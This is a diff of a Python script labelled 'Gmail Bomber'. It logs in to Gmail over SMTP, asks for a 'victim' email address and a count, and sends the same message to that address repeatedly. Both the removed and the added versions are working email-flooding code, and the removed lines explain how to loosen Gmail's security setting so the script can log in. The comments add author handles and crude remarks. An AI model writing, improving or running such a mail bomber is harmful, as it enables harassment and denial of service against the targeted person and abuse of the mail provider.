@@ -14,43 +14,60 @@ print ('''
 ''')
 print(" ")
 #########################   USER INFO ##########################
-user = raw_input('\033[94m[?] \033[97mYour \033[92mGmail\033[97m :\033[93m ')
-passworde = getpass.getpass('\033[94m[?]\033[97m Your \033[91mPassword\033[97m :\033[93m ')
-print(" ")
-victime = raw_input('\033[94m[?]\033[97m The victime \033[91mEMAIL\033[97m : \033[93m')
-message = raw_input('\033[94m[?]\033[97m Your \033[92mMessage\033[97m : \033[93m')
-print(" ")
-hani = input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m : \033[93m')
-print(" ")
-print("\033[94m[*] \033[97mSending : ")
-############################### SMTP_SERVER INFO ##################
-smtp_server = 'smtp.gmail.com'
-port = 587
+#Gmail Bomber by cyb3rs4k1
+#facebook link : https://www.facebook.com/cyb3rs4k1/
+#twitter link : @cyb3rs4k1
+#linkedin link : https://www.linkedin.com/in/cyb3rs4k1/
+#  _______ _                 _           __                 _                     _                 _ _
+# |__   __| |               | |         / _|               | |                   | |               | (_)            
+#    | |  | |__   __ _ _ __ | | _____  | |_ ___  _ __    __| | _____      ___ __ | | ___   __ _  __| |_ _ __   __ _ 
+#    | |  | '_ \ / _` | '_ \| |/ / __| |  _/ _ \| '__|  / _` |/ _ \ \ /\ / | '_ \| |/ _ \ / _` |/ _` | | '_ \ / _` |
+#    | |  | | | | (_| | | | |   <\__ \ | || (_) | |    | (_| | (_) \ V  V /| | | | | (_) | (_| | (_| | | | | | (_| |
+#    |_|  |_| |_|\__,_|_| |_|_|\_|___/ |_| \___/|_|     \__,_|\___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|_|_| |_|\__, |
+#                                                                                                              __/ |
+#                                                                                                             |___/ 
 
-##########################  Login ############################
-try:
-    server = smtplib.SMTP(smtp_server,port) 
-    server.ehlo()
-    if smtp_server == "smtp.gmail.com":
-            server.starttls()
-    server.login(user,passworde)
-###################### SENDING #########################################
-    for i in range(1, hani+1):
-        subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
-        server.sendmail(user,victime,msg)
-        print ("\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
-        sys.stdout.flush()
-    server.quit()
-    print ('\033[93m[✔]\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
-    
-    
-except KeyboardInterrupt:
-    print ('[✘] Canceled')
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print(" ")
-    print("\033[94m[✘] \033[91mError \033[97m:")
-    print ('\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
-    print ("\033[94m[!] \033[97mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
-    sys.exit()
+import smtplib
+import platform
+import getpass
+import sys
+import datetime
+
+smtp   = raw_input("Enter Your Mail Server : ")
+if smtp == 'gmail':
+		server = smtplib.SMTP('smtp.gmail.com',587)
+		server.starttls()
+
+		email     = raw_input("Enter Your Email : ")
+		password  = getpass.getpass("Enter your Password:")
+
+		if not  email  and not password:
+				print ("You must Login to your Gmail")
+		else:
+				server.login(email,password)
+				print ("Successfully Signed in")
+				
+				send = raw_input("Please Enter Your Victim Email : ")
+
+				print("Enter number of times you want to flood")
+				thread= int(raw_input("Count : "))
+				
+
+				msg = raw_input("Enter Your Message :\n")
+				
+				
+
+				for count in range(int(thread)):
+					server.sendmail(email,send,msg)
+					print (count,"Mofo spammed successfully! : ")
+
+
+
+				server.quit()
+
+else:
+		print("You Must Choose 'gmail' ")				
+
+
+#No comments. Simply waste.
+#What you tryna lookin here.
